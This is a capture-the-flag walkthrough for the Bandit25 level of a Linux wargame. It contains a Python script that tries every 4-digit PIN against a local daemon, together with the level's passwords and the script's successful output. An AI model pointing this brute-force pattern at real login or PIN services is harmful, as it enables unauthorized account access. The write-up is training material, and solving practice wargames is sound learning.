# Bandit25

## Level Description
A daemon is listening on port 30002 and will give you the password for `bandit25` if given the password for bandit24 and a secret numeric `4-digit` pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.

You do not need to create new connections each time.

## Method of Solving
As usual, we connect to the `bandit24` server using SSH. We use `nc` netcat to talk to the daemon on port `30002`:
```bash
bandit24@bandit:~$ nc localhost 30002
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
```
Try it with correct password and a random pincode to see how it responds:
```bash
1234
Wrong! Please enter the correct current password and pincode. Try again.
```
We will write a Python script (`bandit25_pass.py`) that brute force the 4-digit PIN code:
```bash
#!/usr/bin/env python3
import socket
import sys

def brute_force():
    password = "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8"
    
    for pincode in range(0, 10000):
        try:
            # Create NEW connection for each attempt
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(2)  # 2-second timeout
                s.connect(("127.0.0.1", 30002))
                
                # Read welcome message (optional)
                welcome_msg = s.recv(2048).decode()
                print(f"Trying {pincode:04d}", end='\r', flush=True)
                
                # Send attempt
                message = f"{password} {pincode:04d}\n"
                s.sendall(message.encode())
                
                # Get response
                response = s.recv(1024).decode()
                
                if "Wrong" not in response:
                    print(f"\nSuccess! PIN: {pincode:04d}")
                    print("Response:", response)
                    return True
                    
        except socket.timeout:
            print(f"\nTimeout on PIN {pincode:04d}, retrying...")
            continue
        except Exception as e:
            print(f"\nError on PIN {pincode:04d}: {str(e)}")
            continue
    
    return False

if __name__ == "__main__":
    if brute_force():
        sys.exit(0)
    else:
        print("\nFailed to find correct PIN")
        sys.exit(1)
```
Make a temporary working directory:
```bash
bandit24@bandit:~$ mktemp -d
/tmp/tmp.t6SNbylp9q
bandit24@bandit:~$ cd /tmp/tmp.t6SNbylp9q
```
This command creates a randomly named directory inside the `/tmp` directory, this directory is writable and completely isolated.

We create a Python file and copy the script into it. Then we run that script to get the correct PIN code and the password for `bandit25`.
```bash
bandit24@bandit:/tmp/tmp.t6SNbylp9q$ nano bandit25_pin.py
Unable to create directory /home/bandit24/.local/share/nano/: No such file or directory
It is required for saving/loading search history or cursor positions.

bandit24@bandit:/tmp/tmp.t6SNbylp9q$ ls
bandit25_pin.py
bandit24@bandit:/tmp/tmp.t6SNbylp9q$ python3 bandit25_pin.py 
Trying 1667
Success! PIN: 1667
Response: Correct!
The password of user bandit25 is iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
```

## Key command

***You are welcome!***
